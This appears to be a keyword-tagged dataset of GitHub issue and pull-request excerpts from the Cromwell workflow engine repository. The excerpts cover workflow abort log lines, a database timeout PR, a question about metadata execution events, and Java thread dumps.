cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:51,499 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:25:56,518 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:01,538 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:06,559 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:11,579 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:16,599 cromwell-system-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:4170,Abort,Abort,4170,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"5:16,358 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:21,379 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:26,399 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:31,419 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:36,439 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:41,459 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:46,479 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:51,499 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:25:56,518 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:01,538 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:06,559 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:11,579 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:16,599 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:21,618 cromwell-system",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:4322,Abort,Abort,4322,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"5:21,379 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:26,399 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:31,419 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:36,439 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:41,459 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:46,479 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:51,499 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:25:56,518 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:01,538 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:06,559 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:11,579 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:16,599 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:21,618 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:26,639 cromwell-system-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:4474,Abort,Abort,4474,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,60-second DB timeout on all metadata queries [BA-5858],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5087:13,timeout,timeout,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5087,1,['timeout'],['timeout']
Safety,"62/). I would like to apologize in advance for any ignorance regarding the documentation that I might have missed. It is not my intention to ask for what I would have known if I had read the documentation better, I am merely trying to grasp the concepts that are abstracted in the Cromwell metadata as described by [the paragraph about metadata in the Cromwell docs](https://cromwell.readthedocs.io/en/stable/SubWorkflows/). When executing a workflow written in WDL and executed with Cromwell (the scientific workflow engine) one can extract metadata out of the Cromwell database. Within this metadata, the following ""executionEvents"" are available for each ""workflow.task"" in the ""calls"" objects. Pending; Requesting ExecutionToken; WaitingFor ValueStore; PreparingJob; CallCache Reading; RunningJob; Updating CallCache; Updating JobStore. From the documentation:; [Call Caching](https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/) allows Cromwell to detect when a job has been run in the past so that it doesn't have to re-compute results, saving both time and money. The main purpose of the [Job Store table](https://cromwell.readthedocs.io/en/stable/developers/bitesize/workflowExecution/workflowSubworkflowAndJobStores/#job-store-job_store_entry) is to support resuming execution of a workflow when Cromwell is restarted by recovering the outputs of completed jobs. I couldn't find a description of the Execution Token nor of the [Value Store](https://cromwell.readthedocs.io/en/stable/developers/bitesize/workflowExecution/jobKeyValueStore/) in [the docs](https://cromwell.readthedocs.io/en/develop/developers/Arch). My questions are the following:. What is the engine waiting on when a task/job is ""Pending""?; Is Requesting an Execution Token something that happens for every task because of security reasons, or does it have to do with the allowed capacity for Cromwell? What types of token are we talking about?; What happens during Value Store, where are which values s",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5579:1261,detect,detect,1261,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5579,1,['detect'],['detect']
Safety,"6a458800 nid=0xbb03 waiting on condition [0x0000000133591000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-12"" #72 prio=5 os_prio=31 tid=0x00007fb76f1b0800 nid=0xb903 waiting on condition [0x00000001332cc000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-11"" #71 prio=5 os_prio=31 tid=0x00007fb76b05a800 nid=0xb703 waiting on condition [0x00000001331c9000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchroniz",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:8566,Unsafe,Unsafe,8566,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"6a6e9800 nid=0xc303 waiting on condition [0x000000013399d000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-15"" #75 prio=5 os_prio=31 tid=0x00007fb76e11d000 nid=0xbf03 waiting on condition [0x0000000133797000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-14"" #74 prio=5 os_prio=31 tid=0x00007fb76dd8e800 nid=0xbd03 waiting on condition [0x0000000133694000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchroniz",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:5929,Unsafe,Unsafe,5929,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"6b05a800 nid=0xb703 waiting on condition [0x00000001331c9000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-10"" #70 prio=5 os_prio=31 tid=0x00007fb76bac5800 nid=0xb503 waiting on condition [0x0000000132fa6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-9"" #69 prio=5 os_prio=31 tid=0x00007fb76f36d800 nid=0xb303 waiting on condition [0x000000012c1b6000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronize",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:10324,Unsafe,Unsafe,10324,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"6cc59800 nid=0xc903 waiting on condition [0x0000000134093000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-18"" #79 prio=5 os_prio=31 tid=0x00007fb76d1d1000 nid=0xc703 waiting on condition [0x0000000133f90000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-17"" #78 prio=5 os_prio=31 tid=0x00007fb76de1b800 nid=0xc503 waiting on condition [0x0000000133df7000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchroniz",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:3292,Unsafe,Unsafe,3292,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"6cc5b800 nid=0xcb03 waiting on condition [0x000000013455e000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-19"" #80 prio=5 os_prio=31 tid=0x00007fb76cc59800 nid=0xc903 waiting on condition [0x0000000134093000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-18"" #79 prio=5 os_prio=31 tid=0x00007fb76d1d1000 nid=0xc703 waiting on condition [0x0000000133f90000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchroniz",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:2413,Unsafe,Unsafe,2413,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"6d1d1000 nid=0xc703 waiting on condition [0x0000000133f90000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-17"" #78 prio=5 os_prio=31 tid=0x00007fb76de1b800 nid=0xc503 waiting on condition [0x0000000133df7000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-16"" #77 prio=5 os_prio=31 tid=0x00007fb76a6e9800 nid=0xc303 waiting on condition [0x000000013399d000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchroniz",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:4171,Unsafe,Unsafe,4171,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"6dd8e800 nid=0xbd03 waiting on condition [0x0000000133694000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-13"" #73 prio=5 os_prio=31 tid=0x00007fb76a458800 nid=0xbb03 waiting on condition [0x0000000133591000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-12"" #72 prio=5 os_prio=31 tid=0x00007fb76f1b0800 nid=0xb903 waiting on condition [0x00000001332cc000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchroniz",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:7687,Unsafe,Unsafe,7687,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"6de1b800 nid=0xc503 waiting on condition [0x0000000133df7000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-16"" #77 prio=5 os_prio=31 tid=0x00007fb76a6e9800 nid=0xc303 waiting on condition [0x000000013399d000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-15"" #75 prio=5 os_prio=31 tid=0x00007fb76e11d000 nid=0xbf03 waiting on condition [0x0000000133797000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchroniz",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:5050,Unsafe,Unsafe,5050,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"6e11d000 nid=0xbf03 waiting on condition [0x0000000133797000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-14"" #74 prio=5 os_prio=31 tid=0x00007fb76dd8e800 nid=0xbd03 waiting on condition [0x0000000133694000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-13"" #73 prio=5 os_prio=31 tid=0x00007fb76a458800 nid=0xbb03 waiting on condition [0x0000000133591000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchroniz",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:6808,Unsafe,Unsafe,6808,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"6f1b0800 nid=0xb903 waiting on condition [0x00000001332cc000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-11"" #71 prio=5 os_prio=31 tid=0x00007fb76b05a800 nid=0xb703 waiting on condition [0x00000001331c9000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at 